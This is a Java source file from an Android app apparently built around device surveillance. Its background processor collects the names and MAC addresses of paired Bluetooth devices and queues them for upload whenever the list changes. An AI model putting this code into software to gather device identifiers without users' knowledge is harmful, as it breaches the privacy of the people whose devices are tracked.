package de.datenkraken.datenkrake.surveillance.processors.background;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.Context;
import android.content.SharedPreferences;

import java.util.Objects;
import java.util.Set;

import de.datenkraken.datenkrake.R;
import de.datenkraken.datenkrake.SubmitBluetoothBondDeviceMutation;
import de.datenkraken.datenkrake.surveillance.ProcessedDataCollector;
import de.datenkraken.datenkrake.surveillance.ProcessedDataPacket;
import de.datenkraken.datenkrake.surveillance.background.IBackgroundProcessor;
import de.datenkraken.datenkrake.surveillance.util.BluetoothUtil;

public class BluetoothBondDevicesProcessor implements IBackgroundProcessor {
    @Override
    public void process(Context context, ProcessedDataCollector collector) {
        if (context == null) {
            return;
        }

        BluetoothAdapter adapter = BluetoothUtil.getAdapter(context);

        if (adapter == null) {
            return;
        }

        Set<BluetoothDevice> bondedDevices = adapter.getBondedDevices();
        SharedPreferences pref =
            context.getSharedPreferences(context.getResources()
                .getString(R.string.surv_shared_preference_name), Context.MODE_PRIVATE);
        int SavedHash =
            pref.getInt(context.getResources().getString(R.string.surv_shared_preference_bond_device_hash), 0);

        int hash = Objects.hash(bondedDevices.toArray());

        if (SavedHash == hash) {
            return;
        }

        ProcessedDataPacket packet;

        long time = System.currentTimeMillis();
        for (BluetoothDevice device : bondedDevices) {
            packet = new ProcessedDataPacket(SubmitBluetoothBondDeviceMutation.OPERATION_ID);
            packet.putLong("timestamp", time);
            packet.putString("name", device.getName());
            packet.putString("address", device.getAddress());
            collector.addPacket(packet);
        }

        pref.edit().putInt(
            context.getResources().getString(R.string.surv_shared_preference_bond_device_hash),
            hash).apply();
    }

    @Override
    public int keepAlive() {
        return 0;
    }
}
